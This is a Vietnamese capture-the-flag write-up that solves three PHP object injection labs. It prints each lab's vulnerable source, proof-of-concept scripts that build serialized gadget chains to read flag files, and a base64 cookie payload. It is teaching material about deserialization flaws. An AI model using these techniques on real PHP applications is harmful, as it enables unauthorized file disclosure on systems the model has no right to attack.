---
title: PHP Object Injection BlueCyber
date: 2022-05-19 11:00:00 +0700
categories: [Writeup]
tags: [writeup, php_object_injection]     # TAG names should always be lowercase
---

# PHP Object Injection BlueCyber

---

## Lab1

Source code

```php
<?php
include 'flag.php';
class pkshow
{

    function echo_name()
    {
        return "Pk very safe^.^";
    }
}

class acp
{

    protected $cinder;
    public $neutron;
    public $nova;
    function __construct()
    {

        $this->cinder = new pkshow;
    }
    function __toString()
    {

        if (isset($this->cinder))
            return $this->cinder->echo_name();
    }
}

class ace
{

    public $filename;
    public $openstack;
    public $docker;
    function echo_name()
    {

        $this->openstack = unserialize($this->docker);
        if($this->openstack->neutron === $this->openstack->nova)
        {

        $file = "./{$this->filename}";
            if (file_get_contents($file))
            {

                return file_get_contents($file);
            }
            else
            {

                return "keystone lost~";
            }
        }
    }
}

if (isset($_GET['pks']))
{

    $logData = unserialize($_GET['pks']);
    echo $logData;
}
else
{

    highlight_file(__file__);
}
?>
```

Trang web nhận tham số đầu vào pks theo phương thức GET và tiến hành unserialize. Ý tưởng ở đây là tùy chỉnh giá trị tham số pks để đọc được nội dung file flag.php chứa flag.

![Untitled](/assets/img/bcObjInjection/Untitled.png)

Ở magic method __construct(), biến cinder đã được khởi tạo là 1 đối tượng thuộc lớp pkshow có phương thức echo_name() để in ra 1 chuỗi

![Untitled](/assets/img/bcObjInjection/Untitled%201.png)

Ta quan tâm đến magic method __toString() sẽ gọi phương thức echo_name() của biến cinder nếu biến cinder đã được khởi tạo

![Untitled](/assets/img/bcObjInjection/Untitled%202.png)

Tiếp tục quan sát source code, ta thấy class ace có phương thức có cùng tên ( echo_name() ) sẽ in ra nội dung của 1 file nếu điều kiện if thỏa mãn

![Untitled](/assets/img/bcObjInjection/Untitled%203.png)

Hướng giải quyết: Gán thuộc tính cinder của class acp bằng 1 đối tượng thuộc class ace, magic method __toString() của class acp sẽ trigger hàm echo_name() để in ra nội dung file tùy ý do người dùng cung cấp

Việc cần giải quyết cuối cùng là làm cho câu lệnh điều kiện if đúng để có thể in ra nội dung file

![Untitled](/assets/img/bcObjInjection/Untitled%204.png)

Để câu lệnh if luôn đúng, ta sẽ tạo ra một class tmp chứa 2 thuộc tính neutron và nova, sau đó gán cho biến docker một đối tượng thuộc lớp tmp, khi đó câu lệnh if sẽ so sánh 2 giá trị null và luôn trả về true

![Untitled](/assets/img/bcObjInjection/Untitled%205.png)

Việc cuối cùng cần làm là gán đường link đến file cần đọc

![Untitled](/assets/img/bcObjInjection/Untitled%206.png)

**POC**

```php
<?php
class acp
{

    protected $cinder;
    public $neutron;
    public $nova;
    function __construct()
    {

        $this->cinder = new ace();
    }
}

class tmp {
    public $neutron;
    public $nova;
}

class ace
{

    public $filename = 'flag.php';
    public $openstack;
    public $docker;

    public function __construct()
    {
      $this->docker = serialize(new tmp());
    }

}

$a = new acp();
// echo "\n";
// echo serialize($a);
echo "\n";
echo(urlencode(serialize($a)));
?>
```

**Flag**

![Untitled](/assets/img/bcObjInjection/Untitled%207.png)

---

## Lab3

![Untitled](/assets/img/bcObjInjection/Untitled%208.png)

Trong file index.php có đoạn code php khởi tạo đối tượng **player** với tên do người dùng nhập vào, sau đó set cookie hero với giá trị là mã hóa base64 chuỗi serialize của đối tượng player vừa tạo

![Untitled](/assets/img/bcObjInjection/Untitled%209.png)

File player.php có đoạn code khai báo class vipPlayer

![Untitled](/assets/img/bcObjInjection/Untitled%2010.png)

Ở đây ta chú ý đến function GetIcon() sẽ trả về chuỗi mã hóa base64 icon của vũ khí

Check file weaporn.php

![Untitled](/assets/img/bcObjInjection/Untitled%2011.png)

Magic method __construct() sẽ gán đường dẫn cho thuộc tính fileIcon

Trong file start.php có đoạn code sẽ render ra icon của vũ khí nếu nhân vật có hàng nóng

![Untitled](/assets/img/bcObjInjection/Untitled%2012.png)

Vector khai thác: lợi dụng magic method __construct() của class weapon và class vipPlayer (vì player không có hàng nóng)

**POC**

```php
<?php

define('BASE', "./");

class weapon
{
	private $fileIcon;

	function __construct()
	{
		$this->fileIcon = BASE . "Fl4g.php";
	}

	public function GetIcon()
	{
		return file_get_contents($this->fileIcon);
	}

	public function GetMaxDamage()
	{
		return 50;
	}
}

class player
{
	protected $name;
	protected $maxDamage;
	protected $health;

	function __construct($name)
	{
		$this->name = $name;
		$this->health = 100;
		$this->maxDamage = 10;
	}

	public function GetName()
	{
		return $this->name;
	}

	public function GetHealth()
	{
		return $this->health;
	}

	public function SetHealth($health)
	{
		$this->health = $health;
	}

	public function attack()
	{
		return rand(0, $this->maxDamage);
	}

	public function HaveWeapon()
	{
		return false;
	}
}

class vipPlayer extends player
{
	private $weapon;

	function __construct($name)
	{
		$this->name = $name;
		$this->health = 200;
		$this->weapon = new weapon();
		$this->maxDamage = $this->weapon->GetMaxDamage();
	}

	public function GetIcon()
	{
		return base64_encode($this->weapon->GetIcon());
	}

	public function HaveWeapon()
	{
		return true;
	}
}

$a = new vipPlayer("a");
echo base64_encode(serialize($a));
?>
```

Ta được payload

```php
Tzo5OiJ2aXBQbGF5ZXIiOjQ6e3M6MTc6IgB2aXBQbGF5ZXIAd2VhcG9uIjtPOjY6IndlYXBvbiI6MTp7czoxNjoiAHdlYXBvbgBmaWxlSWNvbiI7czoxMDoiLi9GbDRnLnBocCI7fXM6NzoiACoAbmFtZSI7czoxOiJhIjtzOjEyOiIAKgBtYXhEYW1hZ2UiO2k6NTA7czo5OiIAKgBoZWFsdGgiO2k6MjAwO30=
```

Chặn bắt request với BurpSuite và đổi giá trị cookie hero, có thể thấy player đã có hàng nóng

![Untitled](/assets/img/bcObjInjection/Untitled%2013.png)

Check ảnh ta có đoạn mã hóa base64

![Untitled](/assets/img/bcObjInjection/Untitled%2014.png)

Decode được flag

![Untitled](/assets/img/bcObjInjection/Untitled%2015.png)

*Bài này anh Tiến thương các em nên để nguyên file Payload.php rồi =)) mình chỉ phân tích*

---

## Lab4

Ta chú ý đến class getFileSystem có magic method __wakeup() (tự động gọi khi unserialize đối tượng) sẽ in ra biến $flag trong file flag.php

![Untitled](/assets/img/bcObjInjection/Untitled%2016.png)

Class User có magic method __destruct() sẽ check xem tin nhắn người dùng nhập vào có phải chuỗi “Blue7eam” không, nếu có sẽ giải mã base64 chuỗi username người dùng nhập vào và unserialize chuỗi đó

![Untitled](/assets/img/bcObjInjection/Untitled%2017.png)

Như vậy, chỉ cần nhập đúng chuỗi tin nhắn “Blue7eam” và username là mã hóa base64 của chuỗi serialize đối tượng thuộc class getFileSystem. Khi đó hàm __destruct() tự động gọi khi chương trình kết thúc sẽ dẫn đến hàm __wakeup() của class getFileSystem được thực thi ⇒ in ra flag.

**POC**

```php
<?php
class getFileSystem{
  public function __wakeup(){
      include('flag.php');
      echo $flag;
  }
}
$a = new getFileSystem();
echo serialize($a);
?>
```

 Flag

![Untitled](/assets/img/bcObjInjection/Untitled%2018.png)
